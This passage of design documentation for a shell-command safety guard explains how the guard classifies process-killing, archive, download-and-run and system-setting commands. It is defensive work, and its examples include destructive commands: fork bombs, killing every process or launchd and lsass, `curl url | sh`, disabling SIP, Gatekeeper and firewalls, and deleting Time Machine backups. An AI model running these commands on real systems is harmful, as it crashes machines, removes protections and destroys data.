the same line. It is risky when the line stops more than a name, and the rule
says how sure the guard is of what it stops. `stop_system` is a stop it reads
for sure: the target is every process, a group, process 1, a process the
system needs, or the machine. `stop_unknown` is a stop it cannot read for sure
(the reason says "may stop", or "only known when it runs"): an id, a name, a
filter or a listing that is known only when the line runs, a substitution or a
pipe it does not follow, or an object it cannot name. That target may be any
process, the ones `stop_system` names included, so the line is risky, but a
caller that decides by rule can tell `kill 0` from `kill $pid`. A line that has
both kinds of stop has both rules (`kill 0; kill $pid`). Splitting the rule
moved no line between safe and risky. Each item below says which rule it is:

- **Every process.** A pattern that matches every process: `pkill -f .`,
  `pkill ''`, `pkill '.*'`, `killall -r .`, `Stop-Process -Name *`,
  `taskkill /IM *`. `pkill` and `killall -r` read a regular expression, and the
  guard asks whether every match must hold a letter or digit the expression
  spells out; `a*`, `(a|)`, `^` and `\w` do not. An expression it cannot read
  (an unclosed `(` or `[`) counts as matching everything. `Stop-Process -Name`
  and `taskkill /IM` read a wildcard (`*`, `?`, `[a-z]`), judged the same way
  after a trailing `.exe` is dropped. `killall5` and `pkill -v` (every
  process but the ones named) are always `stop_system`.
- **Process 0, a group (`stop_system`), or an id it cannot read
  (`stop_unknown`).** `kill` of 0 signals every
  process in the caller's own group, the program that ran the line included
  (`kill 0`, `kill -9 0`), and of a negative id a whole group (`kill -- -1234`,
  `kill -1234`; `-1` is every process). The inline calls `os.kill`, `os.killpg`,
  `process.kill` and `Deno.kill` read the same way (`os.kill(0, 9)`). An id
  only known when it runs (`kill $pid`, `kill $(pgrep x)`, `xargs kill`), or too
  long for a process id, may be any of them, so it is `stop_unknown` (`kill
  99999999999999999999`, `kill '*'`), and so is a negative expansion such as
  `kill -- -$$`, which is the caller's own group only when the shell leads
  it, and `$PPID`, the program that ran the line. An ordinary id (`kill 4242`), a
  job (`kill %1`), `$!`, `$$`, signal 0 (`kill -0 $pid`, which sends nothing)
  and `kill -l` are safe; `kill 1` is `stop_system`. The `kill` program
  reorders its words and reads a signal option after an id (`kill -0 4242 -s 9
  -1` is SIGKILL to every process), so the guard does not model that order. A
  line is signal 0 in one plain shape only: the first word after `kill` is
  exactly `-0`, `-s 0`, `-n 0` or `--signal=0`, and every later word is a
  literal positive decimal id, a job, `$!`, `$$`, `$PPID`, or a plain variable
  (`$pid`, `"$pid"`, `${pid}`): `kill -0 4242`, `kill -0 $pid` and `kill -s 0
  %1`. No other option, no `--`, no brace list, wildcard or substitution and
  no dash anywhere else is allowed, and such a line is judged by its ids as
  any other: `kill -0 0`, `kill -0 -1234`, `kill -0 -1 -s 9`, `kill -0 -q 1
  -s 9 -1`, `kill -0 {-s,KILL} -1` and `kill -0 * -1` are `stop_system` (the
  `-1`; the brace list and the `*` are also `stop_unknown`), and `kill -0
  "$(cat app.pid)"` is `stop_unknown`. The options of any other line are read as the
  shell reads them, every `-s SIG`, `-n SIG`, `-sNAME` and `-nNUM` up to `--`
  or the first other word, and the listing options `-l`, `-L` and `--list`
  count only as the first word (`kill -9 -l -1` still stops every process).
- **Every process of a user, a group or a terminal.** `pkill -u me`, `-U`,
  `-G`, `killall -u me`, `killall -t ttys000`, `killall -Z context`,
  `taskkill /FI "USERNAME eq me"`, given no name. With a name
  (`pkill -u me node`) it is the name that is judged. `killall -c name` is a
  name too, judged as the operands are (`killall -c loginwindow`,
  `killall -m -c .`).
- **Every process a selection picks.** `pkill` given no pattern stops whatever
  its selection picks: `-P`/`--parent`, `-s`/`--session` and `-g`/`--pgroup` of
  0 or 1, or of a value only known when it runs (`pkill -P 1`, the children of
  `launchd` or `init`, which is every app and daemon; `pkill -s 0`, the
  session of the shell that runs the line, which is the terminal's processes;
  `pkill -P "$(pgrep -x launchd)"`), and `-O`/`--older`, `-r`/`--runstates`,
  `--cgroup`, `--ns`, `--nslist`, `--env`, `-t`/`--terminal` with any value
  (`pkill --older 1`, `pkill -t ttys000`). `pkill -P $$` (the shell's own
  children, read by its source text), `pkill -F pids.txt`, `pkill -s 1234` and
  `pkill -P 1 node` (the name is judged) are not. A value an option takes is
  never a pattern (`pkill -q 1 -u me`, `-r R`).
- **Every process a filter picks.** `taskkill` given a filter and no `/IM` or
  `/PID` stops whatever the filter picks: `/FI "STATUS eq RUNNING"`, `/FI
  "MEMUSAGE gt 1"`, `/FI "PID gt 0"`. Only `IMAGENAME eq name` (judged as
  `/IM name` is), `USERNAME` (above) and `STATUS eq NOT RESPONDING`, which
  stops the programs that hang, are read, and so is `PID eq 1234`, which
  names one process and is judged as `/PID 1234` is (`PID eq 0` is not
  safe); with `/IM`, `/PID`, an `IMAGENAME eq` or a `PID eq` filter, the other
  filters only narrow what is named, and the names are judged. `tskill`, the
  Terminal Services way to end a process, is read like `taskkill`: its word
  that is not an option (`/a`, `/v`, `/server:name` and `/id:n` start with a
  slash) is a name when it is not a number, judged as `/IM` is, and an id
  otherwise, judged as `/PID` is (`tskill node` and `tskill 1234` are safe,
  `tskill explorer` and `tskill 0` are `stop_system`, and `tskill $n` is
  `stop_unknown`).
- **A process the system needs.** `launchd`, `systemd`, `init`, `kernel_task`,
  `kthreadd`, `WindowServer`, `loginwindow`, `explorer`, `csrss`, `winlogon`,
  `wininit`, `lsass`, `smss`, `services`, `svchost`, and the ones whose loss
  ends the session or locks you out: `sshd`, the macOS `cfprefsd` and
  `SystemUIServer`, the Linux `Xorg`, `gnome-shell`, `plasmashell`,
  `kwin_x11`, `kwin_wayland`, `dbus-daemon` and `systemd-logind`, and the
  Windows `dwm`; in any case and with
  `.exe` or a folder in front (`killall /sbin/init` picks the process by its
  file, so the last part of the name is the name). The list is short and plain:
  a name the guard cannot read for sure is the next item, not a longer list.
  `pkill` and `killall
  -r`/`-m` search their regular expression in the name, so it is compared two
  ways, per alternative: whole, without its anchors and brackets (`^init$`,
  `/sbin/init`, `Explorer`); and as a regular expression, asking whether it
  can match a system name at all. A name is searched for in the system name:
  `pkill login`, `pkill launch` and `pkill Window` stop `loginwindow`,
  `launchd` and `WindowServer`. A leading `^` wants the name to start with it,
  a trailing `$` to end with it, `-x` both. The case counts, so `pkill -f
  server` is not `WindowServer`, unless it is ignored (`pkill -i`, `killall
  -I`). The expression is read with its syntax, never skipped for having
  some (that is `pkill`'s and `killall`'s POSIX syntax; PowerShell's `-match`
  is .NET's, see the `Where-Object` item below): `.`, a `[…]` set and an escape are one character, a group and `|` are
  read as they are, a `*`, `?` or `{0,…}` lets what it follows match nothing
  and `*`, `+` or `{n,m}` repeat it. Where the syntax is only known roughly
  (an escape, a collating element, `\b`, a back reference) it is read as
  matching more, so `pkill '[l]aunchd'`, `pkill 'log.n'`, `pkill 'login(window)?'`,
  `pkill 'a+'` and `pkill '[[:alpha:]]x'` are `stop_system` while `pkill
  '[n]ode'` and `pkill -f 'node.*server'` are not. Without `-f` a `/` ends
  a folder, so what follows it is the name (`pkill '/sbin/[i]nit'`); `-f`
  matches the whole command line, so there the pattern is also searched, `/`
  and all, in the usual command lines of the system processes
  (`/sbin/launchd`, `/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow console`,
  the `WindowServer -daemon` in SkyLight, `/sbin/init`, `/lib/systemd/systemd`,
  `/usr/lib/systemd/systemd`, and one path for each of the others, such as
  `/usr/sbin/sshd` and `/usr/bin/gnome-shell`), with the arguments launchd
  starts the first two with (its jobs for them run `loginwindow console` and `WindowServer
  -daemon`), and a match that is still going at the end of the line and can
  go on into a space counts, since any further arguments are not known:
  `pkill -f /System/Library`, `pkill -f System`, `pkill -f console`, `pkill
  -f -- -daemon`, `pkill -f 'WindowServer -daemon'` and `pkill -f 'systemd
  --user'` are `stop_system` while `pkill -f 'node server.js'`, `pkill -f
  vite`, `pkill -f 'rails console'` and `pkill -f ./target/debug/myapp` are
  not. `killall` without
  `-r` compares whole names only. A PowerShell or `taskkill` wildcard that
  matches one is the same (`Stop-Process -Name s*`). A service manager that
  stops one is read through the same list: `systemctl stop` or `kill` of
  `systemd-logind`, `sshd` (also `ssh`, which is its unit on Debian) or `dbus`,
  `service … stop` of them, and `launchctl kill` or `stop` of a label that has
  such a name in it (`system/com.apple.WindowServer`,
  `com.apple.cfprefsd.xpc.daemon`) are `stop_system`, while a `launchctl
  kill` or `stop` whose target is only known when it runs is `stop_unknown`;
  the target of any other label (`gui/501/com.me.worker`) is the user's own.
  `systemctl restart` is not a stop and stays safe.
- **A name only known when it runs (`stop_unknown`).** `killall $NAME`,
  `pkill "$PATTERN"`, `xargs pkill`.
- **A listing into `Stop-Process`.** `Stop-Process` is read by its own
  parameters: `-Name` and its alias `-ProcessName`, `-Id`, `-InputObject`,
  `-Force`, `-PassThru`, `-WhatIf`, `-Confirm` and the common ones, each
  written in full or as any prefix that is not another's (`-N`, `-Proc`).
  With no `-Name`, `-Id` or `-InputObject`, it stops what the first stage
  lists: `Get-Process node | Stop-Process` is the name `node`, and any other
  first stage (`$procs | Stop-Process`) is known only when it runs. A
  `Get-Process` that is given `-Id` or `-InputObject` picks processes, as
  `Stop-Process -Id` does, and its ids are judged as that is (see the next item);
  one given no name lists every process. A stage between the listing and `Stop-Process` is never "every
  process": `Where-Object` is read when it only compares `Name` or
  `ProcessName` with `-eq`, `-like` or `-match` (`Where-Object { $_.ProcessName -eq
  'node' }`, `Where-Object Name -like 'node*'`), and judged by that name; a
  `-match` pattern written out is a regular expression searched for in each
  name, read as `pkill` reads one except where .NET differs (below), so
  `-match 'node'` is `-like '*node*'`
  (`-match 'explorer'`, `'.*'`, `''` and `'x|.*$|'` are `stop_system`; a
  pattern only known when it runs, and `-notmatch`, are `stop_unknown`). A
  `-match` pattern is a .NET
  expression, and the guard reads it only in the POSIX ERE subset. Two things
  are read the .NET way: a `/` is a plain character (a process name holds no
  folder, so `'/?explorer'` and `'svc/*host'` are `stop_system`, the `?` or
  `*` applying to the `/`), and an anchor takes a quantifier that makes it
  optional (`'^*explorer'`, `'$?explorer'`, `'^{0,1}svchost'` match like the
  name without it). A pattern outside the subset is not read: one with a
  `(?` in it (a lookaround, an inline option, a comment, a named group, a
  conditional) or an escape that is a letter or digit other than `\d \D \w \W
  \s \S \b \B` (`\x6f`, `\157`, `\cO`, `\uXXXX`, `\p{L}`, `\k<n>`) is not
  read, and the filter is "picked by a filter only known when it runs",
  `stop_unknown` (`-match '^(?!node)'` picks every process but `node`). So is a pattern with
  a backslash inside a bracket expression (.NET reads `[\]o]` as the set `]`
  and `o`, where POSIX closes the set at the first `]`), one with a `[`
  inside a bracket expression (.NET reads `[:`, `[.` and `[=` as a plain `[`
  and closes the set at the next `]`, where POSIX reads a class or a
  collating element up to `:]`, `.]` or `=]`, and `[a-z-[0]]` is a set minus
  another) and one with a
  character that is not ASCII (.NET ignores case by the current culture, so
  `İ` can stand for `i` and `ſ` for `s`, and the guard folds ASCII only);
  `Sort-Object` and a `Select-Object` that only picks (`-First`, `-Last`,
  `-Property Name`) keep some of the same processes; a `Select-Object` given
  `-ExpandProperty` (`-exp`, `-expa`) or a calculated property (a hashtable
  or a script block) hands on other objects, such as a process's parent, and
  is any other stage. Any other filter is "picked by a filter only known when
  it runs", and any other stage, which may hand on other processes, is known
  only when it runs; both are `stop_unknown`. What follows a named listing, when it only picks from it,
  can only narrow it, so the names are judged.
  The same holds when the listing is in the arguments: `-InputObject (Get-Process)`,
  `-Id (Get-Process).Id`, `-Id $(Get-Process node)`, and `$_`, `$PSItem` or
  `$_.Id` given to `-Id` or `-InputObject` inside a `ForEach-Object` block
  of a pipeline that starts with `Get-Process`. Any other `-Id` or
  `-InputObject` value is judged as an id (see the next item).
  Only a member that is the
  process's own passes the listing on: `.Id`, `.Name` and `.ProcessName`, in
  any case. Any other member (`.Parent`, `.Threads`) hands on other objects,
  as `-ExpandProperty` does, and is any other stage: `Stop-Process
  -InputObject (Get-Process notepad).Parent` stops `explorer.exe`, which is
  an app's usual parent, and is `stop_unknown` as `((Get-Process
  node).Parent)` and `(Get-Process node).Parent | Stop-Process` are. The
  same holds for `$_` in a `ForEach-Object` block after a `Get-Process`:
  `.Id`, `.Name` and `.ProcessName` pass the listing on, and any other
  member (`$_.Parent`, `$_.Parent.Id`, `$_.Threads`) is "stops processes only
  known when it runs". A wrapped item is read through what only wraps it,
  parentheses, `$( )`, `@( )`, a cast (`[int]`) and a string that is one
  expansion (`"$($_.Id)"`): `Stop-Process ($_)` and `-Id ([int]$_.Id)` are
  judged like the pipeline (every process after a bare `Get-Process`, the
  name after `Get-Process node`); a value that does anything else with `$_`
  (`($_.Id + 1)`, `"1$($_.Id)"`, `-not $_`, a block of its own) is "stops
  processes only known when it runs". After a first stage that is not a
  `Get-Process` (`Get-NetTCPConnection … | % { Stop-Process -Id $_.OwningProcess }`)
  `$_` is not a process and the value is read as any other `-Id`; the item
  itself (`$procs | % { Stop-Process -Id $_.Id }`) is "stops processes only
  known when it runs". A
  `Get-Process` anywhere else in the arguments, inside another command or a
  block, is read as one such listing, once, however many there are: the
  arguments are read in one pass that never goes below a command, so the time
  is the line's length however deeply they nest.
- **A process picked by an id, or through a method.** An id is safe when it
  is written out in digits: `Stop-Process -Id 1234`, `Stop-Process 1234,5678`,
  `kill 4242`, `taskkill /PID 1234`, `Get-Process -Id 1234 | Stop-Process`,
  and `$PID`, the shell that runs the line. Anything else is a process only
  known when it runs, and may be any process the system needs, so it is
  `stop_unknown`: a variable (`Stop-Process -Id $id`, `-InputObject $p`), a
  file's text (`-Id (Get-Content app.pid)`), another cmdlet's listing
  (`-Id (Get-NetTCPConnection -LocalPort 3000).OwningProcess`, the PowerShell
  of `kill $(lsof -ti:3000)`), the item of a `ForEach-Object` block that no
  `Get-Process` feeds, and a word that is not a number (`0x10`, `-1`,
  `'1234,5678'`, one too long for an id). An id of 0 is the caller's own
  process group where PowerShell runs on Linux or macOS, and 1 is the first
  process of the system, as for `kill`: both are `stop_system`
  (`Stop-Process -Id 0`, `taskkill /PID 1`). `taskkill /PID` and the
  `processid` of `wmic process where processid=1234 delete` are judged the
  same way, and so are the ids a `Get-Process -Id` listing is given. A
  listing counts as the argument only when it is all the argument is: in
  `-Id ((Get-Process node).Id, $x)` and `-Id (Get-Process node).Id, $x` the
  `$x` is judged as an id of its own.

  A method called on a process stops it as `Stop-Process` does: `Kill`,
  `Terminate` (the WMI one) and `CloseMainWindow`, which asks a window to
  close. The call is judged as the `Stop-Process` of its object. The object is
  read for sure in three shapes: a `Get-Process` listing (`(Get-Process
  node).Kill()`, `Get-Process node | % { $_.Kill() }`, `Get-Process node |
  % Kill`, also `ForEach-Object -MemberName Kill`), judged by its name as the
  pipeline is; `[System.Diagnostics.Process]::GetProcessById(1234)` with the
  id in digits, judged as an id; and the item of a block after a listing.
  Every other object may be any process, and is `stop_unknown`: `$p.Kill()`, `$procs | % { $_.Kill()
  }`, `(Get-Process node).Parent.Kill()`, `(Get-Process node)[0].Kill()`,
  `[System.Diagnostics.Process]::GetProcesses() | % { $_.Kill() }`,
  `(Get-WmiObject Win32_Process).Terminate()`. `Invoke-CimMethod` and
  `Invoke-WmiMethod` (also `icim`, `iwmi`) given `Terminate`, and `wmic
  process … call terminate` and `… delete`, stop the processes an instance or
  a `where` clause picks: `wmic process where name="node.exe" call terminate`
  is the name `node.exe`, and `where processid=1234` is an id; no `where`
  stops every process and is `stop_system`, and a `like`, a second condition,
  or a value only known when it runs is `stop_unknown` (in PowerShell a word of the clause that holds a `$` or a
  backtick is such a value, `wmic process where name=$n call terminate`; in
  cmd a `$` is a character of the name), and `process` is the alias of the
  class `path win32_process` (or `cim_process`), so `wmic path win32_process
  where name="explorer.exe" delete` is read as `wmic process where
  name="explorer.exe" delete`. The CIM or WMI method is also `stop_unknown` (the instances come from a
  listing the guard does not follow). The array's `.ForEach('Kill')` is a
  line the grammar does not read, so it is `unreadable`.
- **A fork bomb.** A function that calls itself in the background or as one
  side of a pipeline (`:(){ :|:& };:`, `f() { f & }`, `f() { f | f; }`) is
  `stop_system` however it is called, even when the line only defines it, and
  however the call is written: `\f`, `"f"` and `'f'` call the function `f`, as
  `\rm` is read as `rm`. A
  function defined inside another is judged on its own, by its own name, and
  its commands are not also read as the outer one's. A bomb split over two
  functions that call each other is not read.

`killall`'s and `pkill`'s options are read as they read them: bundled letters,
`-u me` or `-ume`, `--user me` or `--user=me`, a signal (`-9`, `-HUP`,
`-SIGHUP`, `-USR1`; any other run of capitals is options, so `-P1` is `-P 1`
and `-U0` is `-U 0`), long options abbreviated to any prefix that fits one
(`--pa 1` is `--parent 1`; a prefix that fits several is read as the
riskier). psmisc `killall` also takes its long options with one dash
(`killall -user me`, `-ignore-case`, `-context x`), where the BSD one reads
the same word as letters (`-u ser`), so a `killall` line is read both ways and
the riskier counts: `killall -user me` and `killall -context x` (no name, so
every process the filter picks) and `killall -ignore-case -r WINDOW` are
`stop_system`, `killall -user me node` is not. A signal (`-HUP`) is never a
long option. Options written after the first name are read both ways, because
the programs differ: GNU `pkill` reads on, while the macOS and BSD `killall`
and `pkill` stop reading options at the first name, so every later word is a
name too, a `-u` and its user included. Every word after the first name is
therefore also a name, with the value an option takes, and the options are
read as well, so the riskier reading counts: `killall node -u loginwindow`,
`killall node -s WindowServer` and `pkill node -u launchd` are `stop_system`
(the names `loginwindow`, `WindowServer` and `launchd`), while `killall node -s
HUP` and `pkill vite -9` are not. `pgrep` stops nothing and is safe.

A caller that used to stop on `killall node` stops seeing it: it was
`stop_system` ("stops every process with a name") and is now safe.

### Unpacking archives

An archive unpacked into a folder writes into that folder, and the folder is
judged as the destination of `cp` is, by where it resolves (see Paths). With
no folder given, it is the working directory, as moved by a `cd`. The paths
stored inside the archive are not in the line and are not read.

| Program | Folder | Writes nothing |
| --- | --- | --- |
| `tar`, `gtar`, `bsdtar` | `-C dir`, `-Cdir`, `--directory dir`, `--directory=dir`, `--one-top-level=dir` (every one given); an old-style first argument (`tar xf x.tar -C dir`) is read too | no `-x`/`--extract`/`--get`; `-t`, `-c`, `-r`, `-u`, `-A`, `-d`; `-O`/`--to-stdout` |
| `unzip` | `-d dir`, `-ddir`, inside a bundle (`-qod dir`) | `-l`, `-v`, `-t`, `-Z`, `-p`, `-c`, `-z` |
| `7z`, `7za`, `7zr`, `7zz` | `-oDIR` (every one given); `x` and `e` only | any other command (`l`, `a`, `t`) |
| `Expand-Archive` | `-DestinationPath`, or the second positional argument (the first when `-Path` or `-LiteralPath` is named) | |

`tar` takes a long option written as a unique prefix, which the guard reads
for the modes and `--to-stdout` as well as `--directory`: `--ext` and `--extr`
are `--extract` (at least three letters; `--to-s` is `--to-stdout`). A tar line
whose mode is only known when it runs (`tar "$mode" -f x.tar -C ~`, `tar $mode
-C ~`) is judged as if it extracted, unless a mode letter or long mode is
read: `tar -czf "$out" -C ~ .` writes no folder, as `-c` is read.

The reasons say `unpacks into your home directory`, `unpacks into a folder
outside the workspace`, `unpacks into a folder only known when it runs`. A
folder that is the workspace, inside it or a temporary file is not risky.

### Archiving that removes what it archives

Three options make the archiver delete each file once it has packed it:
`tar --remove-files`, `zip -m` (`--move`) and `7z a`/`7z u` with `-sdel`. The
members named on the line are judged as the operands of `rm` are (see
Paths), with the same reasons: `tar -cf x.tar ~ --remove-files` deletes
your home directory, `tar -cf x.tar * --remove-files` is judged as `rm -rf *`,
and `tar -cf x.tar src` and `tar -cf x.tar src --remove-files` are safe.
Packing without the option is no `delete`: `tar -cf x.tar src` is safe. What
it packs is still read, so `tar -cf x.tar ~` is `read_secret` (it reads your
home directory, and the keys in it).

| Program | Option | Members |
| --- | --- | --- |
| `tar`, `gtar`, `bsdtar` | `--remove-files` (a prefix of three letters or more), when the mode makes or adds to an archive: `-c`, `-r`, `-u` or their long forms | the operands, and `--add-file` (`--add-file=f`); an operand after `-C dir` (`-Cdir`, `--directory`) is under `dir`, and a later `-C` is under the one before, up to 512 bytes, past which it is a path known only when it runs; a long option that is a prefix of `--incremental` (`--inc`) or is `--mod` (bsdtar's `--modification-time`) takes no value, though bsdtar's `--include` and GNU's `--mode` do; every operand after `--`; `-T`/`--files-from` name members in a file the line does not show, which is a path known only when it runs |
| `zip` | `-m` anywhere in a bundle (`-mr`, `-rm`), `--move` | the operands after the archive's name, except those that follow a bare `-x`/`--exclude` up to a lone `@` or the end of the line (`-xpat`, `-x=pat` and `--exclude=pat` are one value and open no list); with none, the patterns that follow a bare `-i`/`--include`; `-@`/`--names-stdin` names members the line does not show; `-db`, `-sb`, `-ws` and `-li` are flags that take no value; `-UN` (`-UN=v`, `-UNv`, `-UN v`) and `--unicode` take a value, which is not an option |
| `7z`, `7za`, `7zr`, `7zz` | `-sdel` (any case), with command `a` or `u` | the operands after the archive's name, `-i!pattern` (also `-ir!`, `-ir0!`), and `@list` files, whose members the line does not show; with no operand and no `-i`, `a` and `u` pack everything in the working directory, so the member is `*` |

A `tar` mode that is only known when it runs (`tar "$mode" -f x.tar ~
--remove-files`) is judged as if it packed. A `tar` option that takes a value
in the next argument (`--exclude ~`, `--file x.tar`) does not make that value
a member. An operand only known when it runs is a member known only when it
runs; with `zip`, so is a first operand that is, since it may be the archive
and the members together. A pipeline's input (`ls | xargs zip -m x.zip`) is
the files the stage before it lists. With `7z`, an argument whose readable
start is `-` (`-p"$PASS"`) is a switch, not an operand; one wholly unknown
(`$OPTS`) may be a switch too, so the default `*` stays among the members when
the operands that are certain are only the command and the archive. With
`zip`, an argument only known when it runs inside a `-x` or `-i` list may
start with `-` or be `@`, which end the list, so the names after it are
operands again.

`7z` matches a wildcard itself, quoted or not, and a name that starts with a
dot is among the matches. `zip` does so on Windows; on Unix it matches
wildcards only for `-x`, `-i`, `-R` (the patterns of a recursive add) and the
names inside the archive, so there `zip -m x.zip 'a*'` and
`zip -mr x.zip '*git'` delete nothing. The guard judges the members of `zip` and `7z` alike, with the wildcards matching names that start
with a dot, whatever the shell. For `zip` on Unix this is a cautious choice,
not how the program behaves: `zip -mr x.zip '*git'` is judged as a delete of
`.git`, and so is the unquoted `zip -mr x.zip *git`.

`tar` is given the names the shell expands, so `tar -cf x.tar *git
--remove-files` leaves `.git` as `rm -rf *git` does.

### Git tags and submodules

`git tag -d` and `git tag --delete` are `git_discard` ("deletes a tag"): a tag
has no reflog to bring it back from. `git submodule deinit -f` (or `--force`)
is `git_discard` too: it throws away the submodule's changes; without `-f`
git refuses when there are some. Deleting a tag on a remote (`git push
--delete origin v1`, `git push origin :refs/tags/v1`) is `git_remote`.

### Running a download through `Invoke-Expression`

`iex (iwr url)` is `run_downloaded`, like `iwr url | iex` and `curl url | sh`.
`Invoke-Expression` (`iex`) is given a download when one of its arguments holds
a download cmdlet (`Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`,
`curl` and `wget`, which PowerShell aliases) or a .NET `Download…` call
(`(New-Object Net.WebClient).DownloadString(…)`) or `GetStringAsync`
(`HttpClient`), and then it is not also `unknown`. `Encoding.GetString` decodes
bytes and downloads nothing: `iex ([Text.Encoding]::UTF8.GetString(…))` is
`unknown`. A script held in a variable (`$s = iwr url; iex $s`) is still
`unknown`.

### Machine settings on macOS and Linux

`system_settings` also covers the changes to the machine that `sudo` does not
show. The guard keeps to what is system-wide or turns protection off; reading
a setting and a user's own settings stay safe. Callers treat the rule as one
of their strictest, so each family below was added on that test.

- **Security switches.** `spctl --master-disable`, `--global-disable` and
  `--disable` (Gatekeeper); `csrutil disable`, `authenticated-root disable`
  and `enable --without …` (System Integrity Protection); `setenforce` to
  anything but `1` or `Enforcing`; any write to `/etc/selinux/config` or
  `/etc/sysconfig/selinux`, whatever the program (a redirect, `tee`, `sed -i`,
  `cp`); `nvram` that sets, deletes or clears a variable (`boot-args`). A
  value only known when it runs is risky. `spctl --master-enable`, `csrutil
  status`, `setenforce 1`, `getenforce`, `nvram -p` and reading the files are
  safe.
- **The firewall.** `iptables` and `ip6tables` (and their `-legacy` and
  `-nft` builds) with `-F`/`--flush`, `-X`/`--delete-chain` or a default
  policy of ACCEPT (`-P chain ACCEPT`, `--policy`) for `INPUT`, `FORWARD` or
  a chain only known when it runs; the chain may be attached (`-PINPUT`,
  `-nPINPUT`, `--policy=INPUT`), and then the policy is the next argument.
  `OUTPUT` accepting is the default, so it is not read. `nft` joins its
  arguments with spaces and reads them as one line, so each command in
  them (split at whitespace, `;` and newlines, whichever argument it is in,
  `nft 'flush ruleset'` as well) is read: `flush ruleset|table|chain` and
  `delete|destroy table|chain` are risky, and so is a `flush`, `delete` or
  `destroy` of an object not known to be a set, map, rule or the like
  (`nft flush $what`), or a command word only known when it runs; `-d` and
  `--debug` take a level, as `-f` and `-I` take a value. Under `-j` or
  `--json` (or a prefix of it, or inside a bundle such as `-aj`) the operands
  are JSON, which is not read, so any `{` or `[` in them is risky
  (`nft -j list ruleset` is safe). `ufw disable`,
  `reset` and `default allow` for `incoming`, `routed`, no direction (which
  means incoming) or an unknown one; `ufw default allow outgoing` is ufw's
  stock default and is safe. `firewall-cmd --panic-on` and
  `--set-default-zone`; `pfctl -d` and `-F` with `all`, `rules` or `nat`,
  which may be abbreviated (`-F a`) and attached (`-Fa`, `-qFrules`), or
  with a modifier only known when it runs; `socketfilterfw --setglobalstate
  off`. Adding or deleting one rule, `-P chain DROP`, listing, `ufw allow`,
  `ufw enable` and `firewall-cmd --panic-off` are safe. Loading a ruleset
  from a file (`iptables-restore`, `nft -f`, `pfctl -f`) is not read: the
  file's content is not in the line. Long options may be abbreviated as
  `getopt_long` programs take them (`iptables --fl`), and `firewall-cmd`
  takes any unique prefix too (`--set-default=trusted`).
- **Services the system runs.** `systemctl disable` and `mask`, unless
  `--user` is the last of `--user`, `--system` and `--global`; `launchctl bootout`,
  `unload`, `remove` and `disable`. The one thing read as the workspace's own
  is a plist inside the workspace: `launchctl unload ./x.plist` and
  `launchctl bootout gui/501 ./x.plist` are safe, `bootout gui/501/com.x`
  (a label), `bootout system/…`, and any plist in `/Library/LaunchDaemons` or
  `~/Library/LaunchAgents` are not. `launchctl unload -D domain` unloads
  every plist in that search path (`-D system`, `-D all`), so it is risky
  whatever the domain. A command word only known when it runs
  (`systemctl $verb x`) is risky. `systemctl` options that take a value
  (`-t`, `--message`, `--capsule`, `--what`, `--timestamp`, `--image`,
  `--legend` and the like, also abbreviated) do not count as the verb, and
  are not read as `--user` or `--system` either: one walk of the arguments
  skips the values and finds those two (`systemctl -p --user disable x` is
  a system-wide disable). `timedatectl -p NTP set-ntp false` skips its
  `-p`/`--property` value the same way.
- **Stopping a service.** `systemctl stop`, `systemctl kill` and `service …
  stop` are safe, because `stop docker` is a common development step, and
  `stop` is not a change to what the system runs at boot; `launchctl stop` and `start`,
  `restart`, `enable` and `reload` are safe too. One exception is a unit or
  label that runs a process the system needs (`systemctl stop systemd-logind`,
  `launchctl kill TERM system/com.apple.WindowServer`), which is `stop_system`
  as stopping the process is (see
  [Stopping processes by name](#stopping-processes-by-name)). The other is a unit
  that protects the machine (`firewalld`, `ufw`, `nftables`, `iptables`,
  `ip6tables`, `apparmor`, `auditd`, `fail2ban`), whose stopping is the same
  as turning that protection off, so it is risky. `systemctl kill` sends
  SIGTERM by default, which ends the daemon as `stop` does (and `auditd`
  refuses `stop`, so `kill` is how it is stopped), so it is read through the
  same rule: `systemctl kill firewalld`, `kill -s KILL auditd` and `kill
  'fire*'` are risky, `kill docker` is safe. `systemctl` matches a
  unit name holding `*`, `?` or `[` against the loaded units, so a pattern
  (`systemctl stop 'firewall*'`) is risky too. For `service name action`, an
  action only known when it runs may be `stop`, so it is risky when the name
  protects the machine or is only known when it runs (`service ufw
  $action`); `service nginx $action` is safe, as `service nginx stop` is.
- **Backups.** `tmutil delete`, `deletelocalsnapshots`, `deleteinprogress`,
  `thinlocalsnapshots`, `disable`, `disablelocal` and `removedestination`;
  `listbackups`, `status`, `startbackup` and `enable` are safe.
- **Machine-wide preferences.** `defaults delete <domain>` with no key,
  `defaults import` (the reason says "deletes" for a delete with no key and
  "replaces" for an import), and any `defaults write`, `delete`, `import` or
  `rename` whose domain is a path in a system folder
  (`/Library/Preferences/…`); `pmset` with `-a`, `-b`, `-c` or `-u`, or with
  any first operand but the actions that only act or read (`sleepnow`,
  `displaysleepnow`, `touch`, `noidle`, `boot`), because the flag is
  optional in `pmset sleep 0` and the operand is then a setting; `-g` reads;
  `networksetup` and `systemsetup` options that start `-set`, `-add`,
  `-remove`, `-create`, `-delete`, `-rename`, `-duplicate`, `-order`,
  `-import`; `scutil --set`; `hostnamectl set-…` and `timedatectl set-…`,
  and the verbs `hostnamectl` has since systemd 249 (`hostname`,
  `icon-name`, `chassis`, `deployment`, `location`) when given a value
  (`hostnamectl hostname newname`; with none they print); `hostname name`
  and `hostname -F`. An application's own keys
  (`defaults write com.example.app key value`, `defaults delete com.apple.dock
  persistent-apps`), a path in the workspace or the user's own folder,
  `defaults read`, `pmset -g` and the `-get`/`-list` options are safe.

`hostname` and `service` are read in POSIX shells only: in PowerShell and cmd
they are Windows programs and are left alone.

### The rule enum is exhaustive on purpose

`shell::Rule` is not `#[non_exhaustive]`. A caller decides what to do with each
rule (ask, refuse, allow), so a rule added here must break every caller's
`match` at compile time. With a fallback arm instead, the new rule would pass
through whatever policy the fallback has, and nobody would have chosen it. So a
new rule is a change a caller meets when it bumps its `rev` and fails to
compile, and it decides then; see
[how a change reaches a caller](../../CONTRIBUTING.md#how-a-change-reaches-a-caller).
(`Shell`, core's `Place` and `Shape` are the other way round: they are
`#[non_exhaustive]`, because a caller reads them rarely and a new one is not a
policy decision.)

`Rule::name` is an inherent `const fn`, so a caller needs no trait import, and
core's `RuleName` trait delegates to it. `Rule::ALL` lists every rule once.
Both are in the order of the table above.

## Paths

A path is judged by where it resolves against the working directory (moved by
any `cd`), the home directory and the workspace folders. The path model is
core's; see [Core](core.md). This guard adds what only a shell's syntax gives
a path.

